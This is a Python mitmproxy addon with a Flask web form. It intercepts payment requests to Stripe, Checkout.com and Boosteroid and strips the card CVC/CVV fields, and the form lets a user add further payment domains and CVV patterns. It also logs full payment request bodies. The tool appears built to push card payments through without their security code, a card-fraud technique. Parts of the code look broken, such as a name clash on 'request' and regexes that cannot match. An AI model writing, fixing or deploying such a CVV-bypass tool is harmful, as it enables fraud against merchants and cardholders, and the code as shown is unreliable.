import os
import re
from flask import Flask, request, render_template
from mitmproxy import http, ctx

app = Flask(__name__)

# Domains to intercept for modifying requests and corresponding keys
DOMAIN_KEYS_MAPPING = {
    "api.stripe.com": [
        rb"payment_method_data\[card\]\[cvc\]",
        rb"card\[cvc\]",
        rb"source_data\[card\]\[cvc\]"
    ],
    "cloud.boosteroid.com": [
        rb"encryptedSecurityCode\": \"([^\"\\]+)"
    ],
    "api.checkout.com": [
        rb"\"cvv\": \"(\d{3,4})"
    ]
}

def remove_cvc_from_request_body(request_body, keys_to_remove):
    """
    Removes the CVC value from the request body based on the specified keys.
    """
    for key in keys_to_remove:
        request_body = re.sub(key + rb"=[\d]{3,4}", b"", request_body)
    return request_body

def add_domain_mapping(domain, cvv_regex):
    """
    Adds a new domain mapping to the DOMAIN_KEYS_MAPPING dictionary.
    """
    DOMAIN_KEYS_MAPPING[domain] = [cvv_regex]

@app.route('/HRK', methods=['GET', 'POST'])
def hrk_interface():
    """
    UI interface served on http://HRK for adding new domain mappings.
    """
    if request.method == 'POST':
        domain = request.form['domain']
        cvv_regex = request.form['cvv_regex']
        add_domain_mapping(domain, cvv_regex.encode())
    return render_template('index.html')

def request(flow):
    """
    This function intercepts and modifies requests to remove CVV data.
    """
    for domain, keys in DOMAIN_KEYS_MAPPING.items():
        if domain in flow.request.pretty_host:
            if keys:
                # Log original request data for debugging
                ctx.log.info(f"Original Request Body: {flow.request.text}")

                # Remove CVV codes from the payment data
                flow.request.text = remove_cvc_from_request_body(flow.request.text.encode(), keys).decode()

                # Log modified request data for debugging
                ctx.log.info(f"Modified Request Body: {flow.request.text}")
            else:
                ctx.log.info(f"Skipping request interception for domain: {domain}")

def start():
    """
    Function executed when the proxy starts
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
]

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
